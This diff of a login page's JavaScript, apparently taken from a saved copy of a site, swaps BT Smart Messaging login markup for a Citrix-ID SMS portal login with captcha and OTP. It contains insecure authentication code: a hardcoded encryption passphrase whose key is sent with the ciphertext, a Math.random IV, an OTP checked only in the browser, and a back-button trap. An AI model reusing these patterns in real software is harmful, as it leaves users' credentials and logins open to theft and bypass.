+	var email_reg=/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/
+	currentUrl = window.location.pathname;
+	if(email==""){
+		$(".txtCustomvcEmailErrorMessage").html("Enter Citrix ID");
+		flag=flag+1
+	}
+	
+	if(currentUrl==''+'/admin/' || currentUrl==''+'/Admin/' ){
+		if(email && email.match(email_reg))
+		{
+			$(".txtCustomvcEmailErrorMessage").html("Enter Valid Citrix ID");	
+			flag=flag+1;
+		}
+	}
+	else{
+		if(!emailValidation(email))
+		{
+			//$(".txtCustomvcEmailErrorMessage").html("Enter Valid Citrix ID");	
+			flag=flag+1;
+		}
+	
+	}
+	if(password==""){
+		$(".txtCustomvcPasswordErrorMessage").html("Enter Password");
+		flag=flag+1
+	}
+	if (flag!=1)
+	{
+		return false;
+	}
+	
+});
+///end - code for remember me
+
+history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+        history.go(1);
+    };
+
+function loginDetails()
+{
+	currentUrl = window.location.pathname;
+	signinTypeVal = '';
+	//alert(login_type,"login_type")
+	if(currentUrl==''+'/admin/' || currentUrl==''+'/Admin/')
+	{
+		
+		signinTypeVal=7;
+		$(".adminlogintype").show();
+		if (ldapflag==1 ){
+			$("label[for='id_vcEmail']").text("Enter your CitrixID")
+			$("#id_vcEmail").attr("type", "text"); 
+			$("#id_vcEmail").removeAttr("data-parsley-type");
+			$('#id_vcEmail').attr('data-parsley-required-message', 'Enter CitrixID');
+			
+			adminflag=0
+		}
+	}
+	else
+	{	
+		signinTypeVal =1
+		if(!signinTypeVal)
+		{
+			window.location.href="/";			
+		}
+	}
+
+	$("#signintype").val(signinTypeVal);
+	headerName = 'Admin Login';
+	swithRole = '';
+	if(signinTypeVal==1)
+	{
+		headerName = 'Enterprise SMS Portal';
+		swithRole = 'Enterprise';
+	}
+		
+	$("#signinhead").html(headerName);
+	/*Start: added swithRoleSignupDependent(hide signup for admin logins) -Pushpa 21-03-2019 @ 11:20 AM */
+	if(swithRole)
+	{
+		$("#swithRoleSignupDependent").show();
+		$("#swithLogin").html(swithRole);
+	}
+		
+	else
+	{
+		$("#swithRoleSignupDependent").hide();
+		$("#swithRoleDependent").hide();
+		
+	}
+	/*End: added swithRoleSignupDependent(hide signup for admin logins) -Pushpa 21-03-2019 @ 11:20 AM */
+}
+
+loginDetails();
+
+/*Start : Secure Password - Jagadeesh 2019-02-12 @ 06.00 PM */
+function randomString() 
+{
+	var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
+	var string_length = 32;
+	var randomstring = '';
+	for (var i=0; i<string_length; i++) 
+	{
+			var rnum = Math.floor(Math.random() * chars.length);
+			randomstring += chars.substring(rnum,rnum+1);
+	}
+	return  randomstring;
+}
+
+function sec_pwd(hash)
+{	
+	var salt = CryptoJS.lib.WordArray.random(128/8); 	
+	var key256Bits500Iterations = CryptoJS.PBKDF2("Secret Passphrase", salt, { keySize: 256/32, iterations: 500 });	
+	var iv  = CryptoJS.enc.Hex.parse(randomString()); 	
+	var encrypted = CryptoJS.AES.encrypt(hash, key256Bits500Iterations, { iv: iv }); 
+	//console.log(encrypted.ciphertext.toString());
+	var encdata= encrypted.ciphertext.toString(CryptoJS.enc.Base64); 
+	var enciv   = encrypted.iv.toString(CryptoJS.enc.Base64);       
+	var enckey  = encrypted.key.toString(CryptoJS.enc.Base64);
+	$("#enciv").val(enciv);
+	$("#enckey").val(enckey);	
+	return encrypted;
+}
+/*End : Secure Password - Jagadeesh 2019-02-12 @ 06.00 PM */
+
+function gen_cookie()
+{
+	if($('#rememberme').is(':checked')) {	
+		passwordiv=$("#enciv").val()
+		passwordkey=$("#enckey").val()
+		var shash = sec_pwd(email);
+		$("#encdata").val(shash);
+		email=$("#encdata").val()
+		emailiv=$("#enciv").val()
+		emailkey=$("#enckey").val()
+		$("#enciv").val(passwordiv)
+		$("#enckey").val(passwordkey)
+		ChecksigninType=$("#signintype").val();
+		data={"emailiv":emailiv,"emailkey":emailkey,"passwordiv":passwordiv,"passwordkey":passwordkey,"email":email,"password":password,"ChecksigninType":ChecksigninType}
+		$.ajax({
+				type: "POST",
+				data:data,
+				url:"/rememberme/",
+				async:false,
+				beforeSend: function()
+				{
+					$("#loader-div").show();
+				},
+				success: function (response) {	
+					return true;
+				},
+				error: function(xhr, status, error) { // if error occured
+					$("#loader-div").hide();
+					bootbox.alert("something went wrong");
+					return false;						
+				},
+				complete: function() {						
+					$("#loader-div").hide();
+				},
+			});
+	}
+}
+
+$("#loginForm").submit(function(){
+	//return true; // remove it when writing code as for dummy
+	$("#Loginotp").val("");
+	email=$("#id_vcEmail").val();
+	password=$("#id_vcPassword").val();
+	captcha=$("#id_captcha_1").val();
+	ChecksigninType=$("#signintype").val();
+	flag=1;
+	//alert(adminflag);
+	alert("LoginForm: ", email);
+	$(".txtCustomvcEmailErrorMessage").html("");
+	$(".txtCustomvcPasswordErrorMessage").html("");
+	$(".txtCustomcaptchaErrorMessage").html('');
+
+	/* changes madde as per issue 40748 @satish DROP2 phase1 */
+	var citrix_reg=/[@_]/
+	if(ldapflag && adminflag==0 && email.match(citrix_reg)){
+		$(".txtCustomvcEmailErrorMessage").html("Enter Valid Citrix ID");
+	}
+	/*if(adminflag==0 && email!='' && emailValidation(email) )
+	{
+		$(".txtCustomvcEmailErrorMessage").html("Enter Valid Citrix ID");	
+		flag=flag+1;
+	} */
+	if(adminflag && !emailValidation(email))
+	{
+		flag=flag+1;
+	}
+	if(password==""){
+		$(".txtCustomvcPasswordErrorMessage").html("Enter Password");
+		flag=flag+1
+	}
+	if(captcha==""){
+		$(".txtCustomcaptchaErrorMessage").html("Enter Captcha");
+		flag=flag+1
+	}
+	
+	if (flag!=1)
+	{
+		return false;
+	}
+	$(".txtCustomvcEmailErrorMessage").html("");
+	var hash = $("#id_vcPassword").val();
+	$("#encil").val(hash.length);
+	var shash = sec_pwd(hash);         
+	$("#id_vcPassword").val(shash);
+	password=$("#id_vcPassword").val();
+	
+	$.ajax({
+			type: "POST",
+			data:{"Email":email,"Password":password,"ChecksigninType":ChecksigninType,"enciv":$("#enciv").val(),"enckey":$("#enckey").val(),'captcaha0':$("#id_captcha_0").val(),'captcaha1':$("#id_captcha_1").val()},
+			url:"/check-credentials/",
+			beforeSend: function() {
+					$("#loader-div").show();
+			},			
+			success: function (response) {
+				//sessionStorage.setItem("EP_Role_type",'');
+				//console.log(response)
+				//alert('ccccccccccccccc');
+				if(response.otpflag == 1){
+						
+
+					
+					
+							gen_cookie();
+							//alert('sssssssssssssssss');
+							var form = document.getElementById("loginForm");
+							form.submit();
+					
+						
+					return false;
+					}
+				else{
+					//alert('else');
+					if (response.captchaerror==1){
+						captchaRefresh();
+						$('#id_captcha_1').val('');
+						$(".txtCustomcaptchaErrorMessage").html(response.err_response);
+						$("#login").attr("disabled",false);	
+						return false;
+					}
+					else if (response.emailerror==1)
+					{
+						$(".txtCustomvcEmailErrorMessage").html(response.err_response);
+						$("#login").attr("disabled",false);	
+					}else{
+						$(".txtCustomvcPasswordErrorMessage").html(response.err_response);
+						$("#login").attr("disabled",false);	
+						if(response.unblock!='0')
+						{
+							//console.log('000000000000000');
+							sessionStorage.setItem("EP_Role_type",response.unblock);
+							$("#forgot").hide();	
+							$("#reset").show();	
+						}
+						else{
+							//console.log('2222222222222');
+							sessionStorage.setItem("EP_Role_type",'');
+							$("#forgot").show();	
+							$("#reset").hide();	
+						}
+					}
+					
+					return false;
+				}
+			 },
+			error: function() { // if error occured
+				$("#loader-div").hide();
+				$(".txtCustomvcPasswordErrorMessage").html("something went wrong");
+			},
+			complete: function() {
+				$("#loader-div").hide();
+			},
+		});
+	return false;
+});
+
+
+
+$(document).on('click','#qrverifyotp',function() {
+	otpValue=$("#QrLoginotp").val()
+	qrotp = sessionStorage.getItem("EP_qr_otp") 	
+	
+	if(otpValue==qrotp)
+	{
+		
+		return true;
+	}
+	else
+	{
+		
+		return false;
+	}
+	return false;
+});
+$(document).on('click','#redirectsignin',function() {
+	$("#login").attr("disabled",false);	
+});
+$(document).on('keyup', '#id_vcEmail', function () {
+	var reg=/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/
+	email=$("#id_vcEmail").val();
+	if(email){
+		$(".txtCustomvcEmailErrorMessage").html("");
+	}
+	
+});
+$(document).on('keyup', "#id_vcPassword", function () {
+	var reg=/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+	password=$("#id_vcPassword").val();
+	email=$("#id_vcEmail").val();
+	//console.log($('#forgot').is(":visible"));
+	if(password){
+		$(".txtCustomvcPasswordErrorMessage").html("");
+	}	
+	
+});
+$(document).on('click', '#generateotp', function (e) {
+	$("#Loginotp").val('');
+	var mobileno = sessionStorage.getItem("EP_mb_no");  
+	//document.getElementById("generateotp").innerHTML = "Generating OTP..."; /*Commented to remove dark colour for Resend OTP - pushpa 04-04-2019 @ 10:53 AM */
+	document.getElementById("generateotp").disabled=true;
+	
+	
+	var generateotp=true;
+	if (generateotp==9) { 
+		$("#generateotp").hide();
+		$(".txtCustomvcEmailErrorMessage").html("Already LoggedIn or previous sessions are not closed properly."); 
+	} 
+	else if(generateotp==4){
+			
+				return false;			
+			}
+	else {
+		if(generateotp) {
+			//$('.get-otp a').addClass('grey-otp');/*Commented to remove dark colour for Resend OTP - pushpa 04-04-2019 @ 10:53 AM */
+			$(".login-otp-msg").show();				
+			$("#generateotp").hide();
+			//button.disabled = false;
+			setTimeout(function() {
+				$("#generateotp").show();
+				document.getElementById('generateotp').disabled = false;
+			}, 10000);
+		}
+		else {
+			//button.disabled = false;
+			$("#mobile-number").html("Unable to send OTP, Please try after sometime"); 
+			document.getElementById('generateotp').disabled = false;
+		}
+	}	
+		
+});
+/* End : Mobile Otp Generation */
+
 </script>
 
-
-</div>
   
-<script type="text/javascript">//<![CDATA[
-var ctl04_rfvPassword = document.all ? document.all ["ctl04_rfvPassword"] : document.getElementById ("ctl04_rfvPassword");
-ctl04_rfvPassword.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
-ctl04_rfvPassword.initialvalue = "";
-ctl04_rfvPassword.controltovalidate = "ctl04_txtPassword";
-var ctl04_rfvLogin = document.all ? document.all ["ctl04_rfvLogin"] : document.getElementById ("ctl04_rfvLogin");
-ctl04_rfvLogin.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
-ctl04_rfvLogin.initialvalue = "";
-ctl04_rfvLogin.controltovalidate = "ctl04_txtLogin";
-var ctl04_rfvCustomerID = document.all ? document.all ["ctl04_rfvCustomerID"] : document.getElementById ("ctl04_rfvCustomerID");
-ctl04_rfvCustomerID.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
-ctl04_rfvCustomerID.initialvalue = "";
-ctl04_rfvCustomerID.controltovalidate = "ctl04_txtCustomerID";
-//]]></script>
+<!-- <script type="text/javascript" src="/static/users/js/popper.min.js" ></script>
+ --><script type="text/javascript" src="./DU_files/mdb.min.js.download"></script><div class="hiddendiv common"></div>
+<script type="text/javascript" src="./DU_files/parsley.js.download"></script>
 
-
-<div class="aspNetHidden">
-<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="/bmsweb/Login.aspx">
-</div>
-
-<script type="text/javascript">//<![CDATA[
-	var Page_Validators =  new Array(document.getElementById ('ctl04_rfvCustomerID'), document.getElementById ('ctl04_rfvLogin'), document.getElementById ('ctl04_rfvPassword'));
-//]]></script>
-
-
-<script type="text/javascript">//<![CDATA[
-function setFocus(ctl){if(document.getElementById(ctl) != null){document.getElementById(ctl).focus();}}setFocus('ctl04_txtCustomerID');loadLoginButtonsStyles();
-window.Page_ValidationActive = false;
-window.ValidatorOnLoad();
-window.ValidatorOnSubmit = function () {
-	if (this.Page_ValidationActive) {
-		return this.ValidatorCommonOnSubmit();
-	}
-	return true;
-};
-Sys.Application.initialize();
-
-document.getElementById('ctl04_rfvCustomerID').dispose = function() {
-    Array.remove(Page_Validators, document.getElementById('ctl04_rfvCustomerID'));
-}
-
-document.getElementById('ctl04_rfvLogin').dispose = function() {
-    Array.remove(Page_Validators, document.getElementById('ctl04_rfvLogin'));
-}
-
-document.getElementById('ctl04_rfvPassword').dispose = function() {
-    Array.remove(Page_Validators, document.getElementById('ctl04_rfvPassword'));
-}
-//]]></script>
-</form>
-    
-    <script type="text/javascript" src="./MM_Files/jquery.cookie.js.download"></script>    
-    <script type="text/javascript">
-    $(document).ready(function () {
-        $("#lLoginError").hide();
+ <script type="text/JavaScript" >
+  
+  $(document).ready(function() {
+    $("#loader-div").hide();
+    $('.mdb-select').materialSelect();
+    setTimeout(function() {
+      $('.message').fadeOut('slow');
+    }, 10000); // <-- time in milliseconds, 1000 =  1 sec
+    if($("#populateEncodedMobile").length)
+    {
+      $("#populateEncodedMobile").html(encodedMobile);
+    }
+  });
+</script>
+ <script type="text/javascript">
+    $(function(){   
+        $.notification({
+            cookieEnable: true,
+            text: 'This service requires BT Smart Messaging to store cookies on your computer. If you do not allow cookies to be stored on your computer, you will not be able to log in to the service (and the Login button will be disabled). To find out more about the cookies, see our <a href="" target="_blank" rel ="noopener noreferrer">Privacy Statement</a>.'
     });
-    </script>
-
-
+  });
+</script>
+  <!--All other javascript goes here-->
 
 
 </body></html>
